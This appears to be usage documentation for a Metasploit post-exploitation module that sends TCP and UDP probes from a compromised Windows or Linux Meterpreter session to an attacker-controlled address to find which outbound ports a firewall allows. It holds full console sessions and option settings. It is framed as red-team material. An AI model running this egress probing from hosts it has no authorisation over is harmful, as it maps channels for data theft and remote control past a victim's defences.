This is a Meterpreter post exploitation module that will generate TCP and UDP packets on a range of ports and send them to a provided IP address. The primary purpose of this is for 'egress busting' and provides a rapid method of generating legitimate TCP or UDP traffic on each port. This is useful for red-teaming type exercises in which you have meterpreter running on a host but wish to determine additional ports over which egress traffic is permitted.

It can generate the packets in two different ways; it can call the Windows sockets API (using railgun for Windows clients) or it can create the packets using Rex.

NATIVE mode uses Rex sockets to generate traffic.
WINAPI mode uses Winsock APIs to generate traffic.

As it currently stands, the user will need to set up a listener/tcpdump/wireshark to determine the ports that are open. My [egresscheck-framework](https://github.com/stufus/egresscheck-framework ) code can help with that, but any listener would be fine.

# Example - Windows Meterpreter

Scenario is:

* The victim host is 192.0.2.104
* The attacker is 192.0.2.1
* The attacker wishes to generate TCP packets to 192.0.2.1 (with meterpreter on 192.0.2.104) on ports 22,23,53,80,88,443 and 445 to see if any of the packets reach 192.0.2.1. Note that the attacker has control of 192.0.2.1.
* The compromised machine is a Windows 8.1 machine

```
msf> sessions -l

Active sessions
===============

  Id  Type                   Information             Connection
  --  ----                   -----------             ----------
  2   meterpreter x86/win32  TESTER\Stuart @ TESTER  192.0.2.1:9877 -> 192.0.2.104:43595 (192.0.2.104)

msf> set METHOD NATIVE
METHOD => NATIVE
msf> set PORTS 22,23,53,80,88,443,445
PORTS => 22,23,53,80,88,443,445
msf> set PROTOCOL TCP
PROTOCOL => TCP
msf> set SESSION 2
SESSION => 2
msf> set TARGET 192.0.2.1
TARGET => 192.0.2.1
msf> set THREADS 3
THREADS => 3
msf> show options

Module options (post/multi/manage/multiport_egress_traffic):

   Name      Current Setting         Required  Description
   ----      ---------------         --------  -----------
   METHOD    NATIVE                  yes       The mechanism by which the packets are generated. Can be NATIVE or WINAPI (Windows only). (Accepted: NATIVE, WINAPI)
   PORTS     22,23,53,80,88,443,445  yes       Ports to test.
   PROTOCOL  TCP                     yes       Protocol to use. (Accepted: TCP, UDP)
   SESSION   2                       yes       The session to run this module on.
   TARGET    192.0.2.1               yes       Destination IP address.
   THREADS   3                       yes       Number of simultaneous threads/connections to try.

msf> run
[*] Generating TCP traffic to 192.0.2.1...
[*] TCP traffic generation to 192.0.2.1 completed.
[*] Post module execution completed
msf> set VERBOSE TRUE
VERBOSE => TRUE
msf> run
[*] Number of threads: 3.
[*] Generating TCP traffic to 192.0.2.1...
[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/23
[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/53
[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/22
[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/53
[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/23
[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/22
[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/88
[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/80
[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/443
[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/88
[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/443
[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/80
[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/445
[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/445
[*] TCP traffic generation to 192.0.2.1 completed.
[*] Post module execution completed
```

Here is an example with the METHOD parameter set to WINAPI:

```
msf> set METHOD WINAPI
METHOD => WINAPI
msf> run

[*] Number of threads: 3.
[*] Generating TCP traffic to 192.0.2.1...
[*] [2:WINAPI] Set up socket for 192.0.2.1 port TCP/53 (Handle: 14908)
[*] [1:WINAPI] Set up socket for 192.0.2.1 port TCP/23 (Handle: 14856)
[*] [2:WINAPI] Connecting to 192.0.2.1:TCP/53
[*] [1:WINAPI] Connecting to 192.0.2.1:TCP/23
[*] [0:WINAPI] Set up socket for 192.0.2.1 port TCP/22 (Handle: 14300)
[*] [0:WINAPI] Connecting to 192.0.2.1:TCP/22
[*] [2:WINAPI] There was an error sending a connect packet for TCP socket (port 53) Error: 10061
[*] [0:WINAPI] There was an error sending a connect packet for TCP socket (port 22) Error: 10061
[*] [1:WINAPI] There was an error sending a connect packet for TCP socket (port 23) Error: 10061
[*] [1:WINAPI] Set up socket for 192.0.2.1 port TCP/88 (Handle: 13868)
[*] [0:WINAPI] Set up socket for 192.0.2.1 port TCP/80 (Handle: 14300)
[*] [1:WINAPI] Connecting to 192.0.2.1:TCP/88
[*] [2:WINAPI] Set up socket for 192.0.2.1 port TCP/443 (Handle: 14908)
[*] [0:WINAPI] Connecting to 192.0.2.1:TCP/80
[*] [2:WINAPI] Connecting to 192.0.2.1:TCP/443
[*] [1:WINAPI] There was an error sending a connect packet for TCP socket (port 88) Error: 10061
[*] [2:WINAPI] There was an error sending a connect packet for TCP socket (port 443) Error: 10061
[*] [0:WINAPI] There was an error sending a connect packet for TCP socket (port 80) Error: 10061
[*] [0:WINAPI] Set up socket for 192.0.2.1 port TCP/445 (Handle: 13868)
[*] [0:WINAPI] Connecting to 192.0.2.1:TCP/445
[*] [0:WINAPI] There was an error sending a connect packet for TCP socket (port 445) Error: 10061
[*] TCP traffic generation to 192.0.2.1 completed.
[*] Post module execution completed
```

UDP also works correctly:

```
msf> set PROTOCOL UDP
PROTOCOL => UDP
msf> set METHOD NATIVE
METHOD => NATIVE
msf> show options

Module options (post/multi/manage/multiport_egress_traffic):

   Name      Current Setting         Required  Description
   ----      ---------------         --------  -----------
   METHOD    NATIVE                  yes       The mechanism by which the packets are generated. Can be NATIVE or WINAPI (Windows only). (Accepted: NATIVE, WINAPI)
   PORTS     22,23,53,80,88,443,445  yes       Ports to test.
   PROTOCOL  UDP                     yes       Protocol to use. (Accepted: TCP, UDP)
   SESSION   2                       yes       The session to run this module on.
   TARGET    192.0.2.1               yes       Destination IP address.
   THREADS   3                       yes       Number of simultaneous threads/connections to try.

msf> run

[*] Number of threads: 3.
[*] Generating UDP traffic to 192.0.2.1...
[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/23
[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/53
[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/22
[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/443
[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/80
[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/88
[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/445
[*] UDP traffic generation to 192.0.2.1 completed.
[*] Post module execution completed
```

Note that the errors showing in verbose mode are normal; this is because there is nothing actually listening on any of those ports, meaning that the calls will fail.

Running tcpdump on 192.0.2.1 showed all the connection attempts as normal.

# Example - Linux Meterpreter

Scenario is:

* The victim host is 192.0.2.103
* The attacker is 192.0.2.1
* The attacker wishes to generate TCP packets to 192.0.2.1 (with linux meterpreter on 192.0.2.103) on ports 22,23,53,80,88,443 and 445 to see if any of the packets reach 192.0.2.1. Note that the attacker has control of 192.0.2.1.
* The compromised machine is a Linux machine (running Kali)

```
msf> sessions -l

Active sessions
===============

  Id  Type                       Information             Connection
  --  ----                       -----------             ----------
  4   meterpreter x86/linux      uid=1000, gid=1001, euid=1000, egid=1001, suid=1000, sgid=1001 @ kali  192.0.2.1:4322 -> 192.0.2.103:37489 (192.0.2.103)

msf> run
[*] Number of threads: 3.
[*] Generating TCP traffic to 192.0.2.1...
[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/23
[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/53
[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/22
[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/23
[*] [1:NATIVE] Connecting to 192.0.2.1 port TCP/88
[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/53
[*] [2:NATIVE] Connecting to 192.0.2.1 port TCP/443
[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/22
[*] [1:NATIVE] Error connecting to 192.0.2.1 TCP/88
[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/80
[*] [2:NATIVE] Error connecting to 192.0.2.1 TCP/443
[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/80
[*] [0:NATIVE] Connecting to 192.0.2.1 port TCP/445
[*] [0:NATIVE] Error connecting to 192.0.2.1 TCP/445
[*] TCP traffic generation to 192.0.2.1 completed.
[*] Post module execution completed
msf> set PROTOCOL UDP
PROTOCOL => UDP
msf> run
[*] Number of threads: 3.
[*] Generating UDP traffic to 192.0.2.1...
[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/23
[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/53
[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/22
[*] [2:NATIVE] Connecting to 192.0.2.1 port UDP/443
[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/80
[*] [1:NATIVE] Connecting to 192.0.2.1 port UDP/88
[*] [0:NATIVE] Connecting to 192.0.2.1 port UDP/445
[*] UDP traffic generation to 192.0.2.1 completed.
[*] Post module execution completed
msf> show options

Module options (post/multi/manage/multiport_egress_traffic):

   Name      Current Setting         Required  Description
   ----      ---------------         --------  -----------
   METHOD    NATIVE                  yes       The mechanism by which the packets are generated. Can be NATIVE or WINAPI (Windows only). (Accepted: NATIVE, WINAPI)
   PORTS     22,23,53,80,88,443,445  yes       Ports to test.
   PROTOCOL  UDP                     yes       Protocol to use. (Accepted: TCP, UDP)
   SESSION   4                       yes       The session to run this module on.
   TARGET    192.0.2.1               yes       Destination IP address.
   THREADS   3                       yes       Number of simultaneous threads/connections to try.

msf>
```

![msfegress_tcpdump_udp](https://cloud.githubusercontent.com/assets/12296344/11459958/a7862f22-96da-11e5-86a2-31a4c0153944.png)

# Future Work

This module did not appear to work on python meterpreter.
